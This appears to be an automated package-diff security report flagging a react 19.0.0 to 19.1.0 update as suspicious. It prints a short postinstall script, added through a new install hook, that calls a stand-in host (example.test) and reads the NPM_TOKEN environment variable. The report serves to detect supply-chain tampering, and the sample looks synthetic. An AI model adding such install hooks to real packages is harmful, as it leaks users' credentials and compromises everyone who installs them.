# react 19.0.0 → 19.1.0 (npm)

- Status: `ok`
- Verdict: `suspicious`
- Confidence: `high`

## Diff summary

- Files added: 4
- Files removed: 1
- Files changed: 1
- Signals:
  - `network-process-env-access-added`
  - `dependency-added`
  - `install-script-added`
  - `entrypoint-changed`
- Changed paths:
  - `dist`
  - `dist/index.js`
  - `scripts`
  - `scripts/postinstall.js`
  - `index.js`
  - `package.json`

## Review

- Reasons:
  - `install script and dependency changes require review`
  - `postinstall script now touches network/process/env APIs`
- Focus files:
  - `package.json`
  - `scripts/postinstall.js`

## Manifest diff

```diff
--- old/package.json
+++ new/package.json
@@ -1,11 +1,13 @@
 {
   "name": "react",
-  "version": "19.0.0",
-  "main": "index.js",
+  "version": "19.1.0",
+  "main": "dist/index.js",
   "scripts": {
-    "test": "node test.js"
+    "test": "node test.js",
+    "postinstall": "node scripts/postinstall.js"
   },
   "dependencies": {
-    "scheduler": "1.0.0"
+    "scheduler": "1.0.0",
+    "left-pad": "1.3.0"
   }
 }
```

## Interesting files

### `scripts/postinstall.js`

- Reason: network/process/env access added

```text
   1: const { exec } = require("node:child_process");
   2: fetch("https://example.test/install");
   3: console.log(process.env.NPM_TOKEN);
```

### `package.json`

- Reason: dependency added

```text
   9:   "dependencies": {
  10:     "scheduler": "1.0.0",
  11:     "left-pad": "1.3.0"
  12:   }
  13: }
```

### `package.json`

- Reason: install script added

```text
   5:   "scripts": {
   6:     "test": "node test.js",
   7:     "postinstall": "node scripts/postinstall.js"
   8:   },
   9:   "dependencies": {
```

### `package.json`

- Reason: entrypoint changed

```text
   2:   "name": "react",
   3:   "version": "19.1.0",
   4:   "main": "dist/index.js",
   5:   "scripts": {
   6:     "test": "node test.js",
```

